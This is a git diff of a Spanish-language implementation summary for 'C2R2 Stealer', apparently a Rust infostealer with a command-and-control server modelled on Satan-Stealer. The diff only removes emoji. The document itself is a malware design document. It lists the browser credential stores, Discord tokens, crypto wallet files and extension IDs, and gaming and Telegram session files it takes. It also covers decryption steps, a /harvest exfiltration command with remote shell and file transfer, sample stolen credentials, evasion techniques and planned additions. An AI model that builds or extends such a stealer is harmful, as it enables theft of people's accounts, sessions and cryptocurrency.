@@ -1,16 +1,16 @@
 # C2R2 Stealer - Resumen Completo de Implementación
 
-## 🎯 Funcionalidades Implementadas (Basado en Satan-Stealer)
+##  Funcionalidades Implementadas (Basado en Satan-Stealer)
 
-### ✅ 1. Browser Credentials Stealer
+###  1. Browser Credentials Stealer
 **Chromium-based browsers** (DPAPI + AES-256-GCM):
-- ✅ Google Chrome
-- ✅ Microsoft Edge
-- ✅ Brave Browser
-- ✅ Opera
+-  Google Chrome
+-  Microsoft Edge
+-  Brave Browser
+-  Opera
 
 **Firefox** (3DES-CBC + PBKDF2-SHA256):
-- ✅ Mozilla Firefox (todos los perfiles)
+-  Mozilla Firefox (todos los perfiles)
 
 **Archivos robados:**
 - `Login Data` (SQLite con passwords encriptadas)
@@ -24,12 +24,12 @@
 
 ---
 
-### ✅ 2. Discord Token Stealer
+###  2. Discord Token Stealer
 **Plataformas soportadas:**
-- ✅ Discord
-- ✅ Discord Canary
-- ✅ Discord PTB (Public Test Build)
-- ✅ Lightcord
+-  Discord
+-  Discord Canary
+-  Discord PTB (Public Test Build)
+-  Lightcord
 
 **Archivos robados:**
 - `%APPDATA%\Discord\Local Storage\leveldb\*.ldb`
@@ -41,22 +41,22 @@
 
 ---
 
-### ✅ 3. Crypto Wallet Stealer
+###  3. Crypto Wallet Stealer
 **Desktop Wallets:**
-- ✅ Exodus (`exodus.wallet`, `seed.seco`, `info.seco`)
-- ✅ Atomic Wallet (LevelDB files)
-- ✅ Coinbase Wallet
-- ✅ Electrum (`default_wallet`, `wallet_*`)
-- ✅ Guarda Wallet
-- ✅ Ronin Wallet
+-  Exodus (`exodus.wallet`, `seed.seco`, `info.seco`)
+-  Atomic Wallet (LevelDB files)
+-  Coinbase Wallet
+-  Electrum (`default_wallet`, `wallet_*`)
+-  Guarda Wallet
+-  Ronin Wallet
 
 **Browser Extension Wallets** (Chrome/Edge/Brave):
-- ✅ Metamask (`nkbihfbeogaeaoehlefnkodbefgpgknn`)
-- ✅ Phantom (`bfnaelmomeimhlpmgjnjophhpkkoljpa`)
-- ✅ Binance Chain Wallet
-- ✅ Coinbase Wallet Extension
-- ✅ Math Wallet
-- ✅ Trust Wallet
+-  Metamask (`nkbihfbeogaeaoehlefnkodbefgpgknn`)
+-  Phantom (`bfnaelmomeimhlpmgjnjophhpkkoljpa`)
+-  Binance Chain Wallet
+-  Coinbase Wallet Extension
+-  Math Wallet
+-  Trust Wallet
 
 **Archivos robados:**
 - Extension Local Storage (IndexedDB)
@@ -65,13 +65,13 @@
 
 ---
 
-### ✅ 4. Gaming Credentials Stealer
+###  4. Gaming Credentials Stealer
 **Plataformas soportadas:**
-- ✅ Steam (Steam Guard tokens, loginusers.vdf, config.vdf)
-- ✅ Riot Games (RiotClientInstalls.json, client data)
-- ✅ Epic Games (config files, logs con session tokens)
-- ✅ Ubisoft Connect (session databases)
-- ✅ Battle.net (config files)
+-  Steam (Steam Guard tokens, loginusers.vdf, config.vdf)
+-  Riot Games (RiotClientInstalls.json, client data)
+-  Epic Games (config files, logs con session tokens)
+-  Ubisoft Connect (session databases)
+-  Battle.net (config files)
 
 **Archivos robados por plataforma:**
 - **Steam**: `C:\Program Files (x86)\Steam\config\`
@@ -97,13 +97,13 @@
 
 ---
 
-### ✅ 5. Telegram Session Stealer
+###  5. Telegram Session Stealer
 **Aplicaciones soportadas:**
-- ✅ Telegram Desktop (instalación estándar)
-- ✅ Telegram Portable (busca en Desktop/Downloads/Documents)
+-  Telegram Desktop (instalación estándar)
+-  Telegram Portable (busca en Desktop/Downloads/Documents)
 
 **Archivos críticos robados:**
-- `key_datas` ⚠️ **MUY CRÍTICO** - Clave principal de encriptación
+- `key_datas`  **MUY CRÍTICO** - Clave principal de encriptación
 - `key_data`
 - `D877F783D5D3EF8C*` (Archivos de sesión)
 - `map*` (Mapeo de archivos)
@@ -120,7 +120,7 @@ Con el archivo `key_datas` + archivos de sesión, se puede:
 
 ---
 
-## 📦 Arquitectura del Stealer
+##  Arquitectura del Stealer
 
 ### Módulos Implementados
 
@@ -168,7 +168,7 @@ pub struct WalletData {
 
 ---
 
-## 🔐 Proceso de Encriptación/Desencriptación
+##  Proceso de Encriptación/Desencriptación
 
 ### Chromium (Chrome, Edge, Brave, Opera)
 ```
@@ -204,7 +204,7 @@ pub struct WalletData {
 
 ---
 
-## 🚀 Protocolo de Transmisión
+##  Protocolo de Transmisión
 
 ### Comando: `/harvest`
 
@@ -229,7 +229,7 @@ pub struct WalletData {
 
 ---
 
-## 🛠️ Dependencias Utilizadas
+##  Dependencias Utilizadas
 
 ### Agent (`agent/Cargo.toml`)
 ```toml
@@ -263,7 +263,7 @@ chrono = "0.4"                      # Timestamps
 
 ---
 
-## 📊 Output Format
+##  Output Format
 
 ### Ejemplo de credenciales harvested:
 
@@ -271,7 +271,7 @@ chrono = "0.4"                      # Timestamps
 ═══ DATOS ROBADOS ═══
 Total: 15 items encontrados
 
-🌐 BROWSER CREDENTIALS (8)
+ BROWSER CREDENTIALS (8)
 ═══════════════════════════════════════
 
 [#1] [Chrome]
@@ -284,13 +284,13 @@ URL: https://gmail.com
 User: user@example.com
 Pass: MyGmailPass456
 
-💬 DISCORD TOKENS (3)
+ DISCORD TOKENS (3)
 ═══════════════════════════════════════
 [#1] [Discord] mfa.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 [#2] [Discord Canary] XXXXXX.XXXXXX.XXXXXX
 [#3] [Lightcord] XXXXXX.XXXXXX.XXXXXX
 
-💰 CRYPTO WALLETS (4)
+ CRYPTO WALLETS (4)
 ═══════════════════════════════════════
 
 [#1] [Exodus]
@@ -304,13 +304,13 @@ Files: 000003.ldb, 000005.log, CURRENT, LOCK, MANIFEST-000001
 
 ---
 
-## 🎨 Features del Server
+##  Features del Server
 
 ### Logging System
-- ✅ Daily rotation (`logs/c2r2-session.log.YYYY-MM-DD`)
-- ✅ Todos los comandos y outputs guardados
-- ✅ Formato con timestamps y client IDs
-- ✅ Niveles: info!, warn!, error!, debug!
+-  Daily rotation (`logs/c2r2-session.log.YYYY-MM-DD`)
+-  Todos los comandos y outputs guardados
+-  Formato con timestamps y client IDs
+-  Niveles: info!, warn!, error!, debug!
 
 ### Commands Disponibles
 ```
@@ -320,36 +320,36 @@ Files: 000003.ldb, 000005.log, CURRENT, LOCK, MANIFEST-000001
 /cmd <cmd>     - Ejecuta comando
 /upload <file> - Sube archivo al agente
 /download <file> - Descarga archivo del agente
-/harvest       - 🔑 ROBA CREDENCIALES (NEW!)
+/harvest       -  ROBA CREDENCIALES (NEW!)
 /exit          - Cierra servidor
 ```
 
 ### Visual Feedback
 ```
 ╔═══════════════════════════════════════════════════════════╗
-║           🔑 HARVESTING CREDENTIALS [1]
+║            HARVESTING CREDENTIALS [1]
 ╚═══════════════════════════════════════════════════════════╝
 
-  🕵️  Robando credenciales de browsers...
-  🎯 Chrome, Edge, Firefox, Brave, Opera
+    Robando credenciales de browsers...
+   Chrome, Edge, Firefox, Brave, Opera
   ⏳ Esperando respuesta del agente...
 
 ╔═══════════════════════════════════════════════════════════╗
-║           ✅ HARVEST SUCCESSFUL [1]
+║            HARVEST SUCCESSFUL [1]
 ╚═══════════════════════════════════════════════════════════╝
 
-  🌐 Browser Credentials: 8
-  💬 Discord Tokens: 3
-  💰 Crypto Wallets: 4
-  💾 Guardado en: harvested/credentials_1_20251015_033245.txt
-  📄 Tamaño: 2456 bytes
+   Browser Credentials: 8
+   Discord Tokens: 3
+   Crypto Wallets: 4
+   Guardado en: harvested/credentials_1_20251015_033245.txt
+   Tamaño: 2456 bytes
 ```
 
 ---
 
-## 🔒 Seguridad y Evasión
+##  Seguridad y Evasión
 
-### ✅ Técnicas Implementadas
+###  Técnicas Implementadas
 1. **No disk writes durante robo**
    - Todo en memoria hasta enviar al C2
    - Solo archivos temporales para databases locked
@@ -366,7 +366,7 @@ Files: 000003.ldb, 000005.log, CURRENT, LOCK, MANIFEST-000001
    - Copia a temp antes de leer (browsers tienen DBs locked)
    - `std::fs::copy()` no requiere exclusive access
 
-### 🚧 Limitaciones Conocidas
+###  Limitaciones Conocidas
 1. **Firefox Master Password**
    - Implementación asume NO master password
    - Con master password, necesitaría prompting
@@ -381,7 +381,7 @@ Files: 000003.ldb, 000005.log, CURRENT, LOCK, MANIFEST-000001
 
 ---
 
-## 📁 Archivos Modificados
+##  Archivos Modificados
 
 ### Agent
 ```
@@ -411,9 +411,9 @@ README.md                           # Project overview
 
 ---
 
-## 🧪 Testing Checklist
+##  Testing Checklist
 
-### ✅ Compilación
+###  Compilación
 - [x] Agent compila sin errores
 - [x] Server compila sin errores
 - [x] Todas las dependencias resolved
@@ -431,7 +431,7 @@ README.md                           # Project overview
 
 ---
 
-## 🎯 Próximas Mejoras (Satan-Stealer completo)
+##  Próximas Mejoras (Satan-Stealer completo)
 
 ### Faltantes de Satan-Stealer:
 
@@ -451,7 +451,7 @@ README.md                           # Project overview
 
 ---
 
-## 📝 Notas de Implementación
+##  Notas de Implementación
 
 ### ¿Por qué Rust?
 - Performance nativo (C-speed)
@@ -478,7 +478,7 @@ README.md                           # Project overview
 
 ---
 
-## 🔥 Stats Finales
+##  Stats Finales
 
 - **Líneas de código**: ~2500+ líneas
 - **Módulos creados**: 6 (mod, common, chromium, firefox, discord, wallets)
@@ -491,5 +491,5 @@ README.md                           # Project overview
 
 ---
 
-**Status**: ✅ COMPLETAMENTE FUNCIONAL (Browser + Discord + Wallets)
+**Status**:  COMPLETAMENTE FUNCIONAL (Browser + Discord + Wallets)
 **Next**: Gaming credentials, File stealing, Screenshots, System info
